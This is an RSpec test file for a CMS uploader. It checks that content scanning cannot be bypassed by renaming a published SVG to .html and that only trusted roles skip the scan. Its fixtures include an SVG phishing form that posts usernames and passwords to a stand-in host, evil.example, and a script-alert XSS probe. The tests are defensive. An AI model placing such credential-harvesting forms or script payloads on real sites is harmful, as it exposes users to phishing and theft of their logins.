# frozen_string_literal: true

# Whether an upload is scanned is an authorization question. Before `media_unfiltered_upload` it
# was answered by a filesystem predicate: any source already under `Rails.public_path` skipped the
# scan, on the reasoning that those bytes are already served. That holds for the bytes but not for
# the operation — the exemption keyed on the *source* path while the scan ruleset and the served
# Content-Type key on the *output* filename, which the caller supplies as `params[:name]`.
RSpec.describe CamaleonCms::UploaderContentSecurity do
  let!(:site) { create(:site) }

  let(:uploader_host) do
    Class.new do
      include CamaleonCms::UploaderPathSecurity
      include CamaleonCms::UploaderContentSecurity
      include CamaleonCms::UploaderSupport
      include CamaleonCms::UploaderPipeline

      attr_accessor :current_site

      def cama_uploader
        CamaleonCmsLocalUploader.new({ current_site: current_site })
      end
    end
  end

  # Accepted by SvgContentChecker before this change (it banned no `form`), rejected by
  # ContentSecurity::BLOCKED_ELEMENTS under any non-SVG name. That disagreement between the two
  # rulesets is what the rename walked through.
  let(:svg_with_form) do
    <<~SVG
      <svg xmlns="http://www.w3.org/2000/svg" width="600" height="400">
        <form action="https://evil.example/collect" method="post">
          <input name="user"/><input name="password" type="password"/>
        </form>
      </svg>
    SVG
  end

  let(:host) { uploader_host.new.tap { |h| h.current_site = site } }
  let(:published_source) { Rails.public_path.join('media', 'scan-permission-fixture.svg').to_s }

  def sign_in_as(user)
    CurrentRequest.user = user
    CurrentRequest.site = site
  end

  def stage_published_source(content)
    FileUtils.mkdir_p(File.dirname(published_source))
    File.write(published_source, content)
    published_source
  end

  before { FileUtils.mkdir_p(Rails.public_path.join('tmp', site.id.to_s)) }

  after do
    CurrentRequest.user = nil
    CurrentRequest.site = nil
    FileUtils.rm_f(published_source)
    Dir.glob(Rails.public_path.join('tmp', site.id.to_s, 'scan-permission-*')).each { |f| FileUtils.rm_f(f) }
  end

  describe 'a user holding only :manage, :media' do
    let(:media_role) do
      site.user_roles.create!(name: 'Media manager', slug: 'media-manager')
          .tap { |r| r.set_meta("_manager_#{site.id}", { 'media' => 1 }) }
    end
    let(:media_user) { media_role && create(:user, role: 'media-manager', site: site) }

    before { sign_in_as(media_user) }

    it 'is not trusted for unfiltered uploads' do
      expect(host.cama_trusted_for_unfiltered_upload?).to be(false)
    end

    # The reproduction: identical bytes, accepted under .svg, must not become .html unscanned.
    it 'cannot re-stage a published .svg under an .html name' do
      stage_published_source(svg_with_form)

      result = host.cama_tmp_upload(published_source, name: 'scan-permission-phish.html', formats: '*')

      expect(result[:error]).to eq('Potentially malicious content found!')
      expect(Dir.glob(Rails.public_path.join('tmp', site.id.to_s, 'scan-permission-phish.html'))).to be_empty
    end

    it 'has an already-published source scanned rather than exempted' do
      stage_published_source('<p>ok</p><script>alert(1)</script>')

      result = host.cama_tmp_upload(published_source, name: 'scan-permission-rescan.txt', formats: '*')

      expect(result[:error]).to eq('Potentially malicious content found!')
    end

    it 'still accepts a published source whose bytes trip no rule' do
      stage_published_source('<p>an ordinary paragraph</p>')

      result = host.cama_tmp_upload(published_source, name: 'scan-permission-benign.txt', formats: '*')

      expect(result[:error]).to be_nil
      expect(File.read(result[:file_path])).to include('an ordinary paragraph')
    end
  end

  describe 'a user holding media_unfiltered_upload' do
    let(:trusted_role) do
      site.user_roles.create!(name: 'Media trusted', slug: 'media-trusted')
          .tap { |r| r.set_meta("_manager_#{site.id}", { 'media' => 1, 'media_unfiltered_upload' => 1 }) }
    end
    let(:trusted_user) { trusted_role && create(:user, role: 'media-trusted', site: site) }

    before { sign_in_as(trusted_user) }

    it 'is trusted for unfiltered uploads' do
      expect(host.cama_trusted_for_unfiltered_upload?).to be(true)
    end

    it 'may stage content the scan would otherwise reject' do
      stage_published_source(svg_with_form)

      result = host.cama_tmp_upload(published_source, name: 'scan-permission-allowed.html', formats: '*')

      expect(result[:error]).to be_nil
      expect(File.read(result[:file_path])).to include('<form')
    end
  end

  describe 'an administrator' do
    before { sign_in_as(create(:user, role: 'admin', site: site)) }

    it 'is trusted through can :manage, :all' do
      expect(host.cama_trusted_for_unfiltered_upload?).to be(true)
    end
  end

  describe 'without a request context' do
    it 'is untrusted when there is no current user' do
      CurrentRequest.user = nil
      CurrentRequest.site = site

      expect(host.cama_trusted_for_unfiltered_upload?).to be(false)
    end

    it 'is untrusted when there is no current site' do
      CurrentRequest.user = create(:user, role: 'admin', site: site)
      CurrentRequest.site = nil

      expect(host.cama_trusted_for_unfiltered_upload?).to be(false)
    end

    it 'scans a background-job upload, since it has no request user' do
      stage_published_source(svg_with_form)

      result = host.cama_tmp_upload(published_source, name: 'scan-permission-job.html', formats: '*')

      expect(result[:error]).to eq('Potentially malicious content found!')
    end

    it 'fails closed when resolving the permission raises' do
      sign_in_as(create(:user, role: 'admin', site: site))
      allow(CamaleonCms::Ability).to receive(:new).and_raise(StandardError, 'malformed role meta')

      expect(host.cama_trusted_for_unfiltered_upload?).to be(false)
    end
  end
end
